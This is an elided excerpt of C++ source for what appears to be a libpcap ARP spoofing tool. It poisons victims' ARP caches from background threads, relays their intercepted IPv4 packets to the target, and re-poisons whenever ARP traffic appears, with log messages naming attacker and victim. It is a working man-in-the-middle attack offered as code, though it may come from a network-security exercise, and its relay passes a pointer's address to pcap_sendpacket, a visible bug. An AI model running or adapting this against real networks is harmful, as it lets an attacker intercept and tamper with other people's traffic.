...
void set_attacker(char* interface)
{
	...
	cout << "LOG:: My Mac address :: " << (string)attacker_mac << '\n';
	cout << "LOG:: My IP address :: (reversed)" << (string)attacker_ip << '\n';
}
...
void background_send_arp(int idx)
{
	while (1)
	{
		...
		if (res == -1)
		{
			cout << "LOG:: Something broke in Pipe at " << idx << " th background poison-arp \n";
		}

		cout << "LOG:: Send Arp : " << idx << "th background send arp \n";
...
Mac from_ip(Ip _ip)
{
	...
	while (cnt < N_ITER)
	{
		...
		if (_current_arp->sip_ != htonl(_ip))
			continue;
		cout << "LOG:: Found The Mac from IP " << (string)_ip << " : \n " << (string)_current_arp->smac_ << endl;
		return _current_eth->smac_;
	}
	cout << "LOG:: iterated over " << N_ITER << "but no hope" << endl;
	return Mac((string)"00:00:00:00:00:00");
}

int relay(EthHdr* context_packet, int idx, int lens)
{
	context_packet->smac_ = attacker_mac;
	context_packet->dmac_ = target_macs[idx];

	char* packet = (char*)context_packet;



	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), lens);
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	cout << "LOG:: Relayed Packet Sized " << lens << ", \n";
	return 0;
}
...
int main(int argc, char* argv[])
{
	...
	for (int i = 2; i < argc; i += 2)
	{
		...
		cout << "LOG:: Retreiving Mac from Victom's Ip \n";

		sender_macs[idx] = from_ip(sender_ip);
		target_macs[idx] = from_ip(target_ip);
	}

	cout << "LOG:: Successfully found macs \n";
	cout << "LOG:: N-attack pairs " << n_args << "\n";

	for (int i = 0; i < n_args; i++)
	{
		thread(background_send_arp, i).detach();
	}

	cout << "LOG:: background activated\n";
	...
	while (1)
	{
		...
		{ // Is ipv4
			...
			{
				//cout << "LOG:: Found Valid IPv4 Packet : " << endl;
				for (int i = 0; i < n_args; i++)
				{
					if ((uint32_t)sender_ips[i] == ntohl(*this_sip) && this_dmac == attacker_mac)
					{
						...
						//   A <- recieved packet. 
						//  
						cout << "LOG:: Found matching arg pair in list. Relay." << endl;
						int x = relay(_current_eth, i, header->caplen);
						if (x == 0) {
							cout << "LOG:: Relay Succesful" << '\n';
						}
					}
				}
			}
		...
		{
			cout << "LOG:: Found Arp Packet : " << endl;
			ArpHdr* _current_arp = (struct ArpHdr*)(packet + 14);
			...
			for (int i = 0; i < n_args; i++)
			{
				...
				{
					cout << "LOG:: Found matching arg pair in list. Repoison." << endl;
					int res = send_arp(
						sender_macs[i],
						attacker_mac,
						attacker_mac,
						...
						ArpHdr::Reply);
					if (res == -1) {
						cout << "LOG:: Error in Repoisoning" << endl;
					}
				}
			}
		}
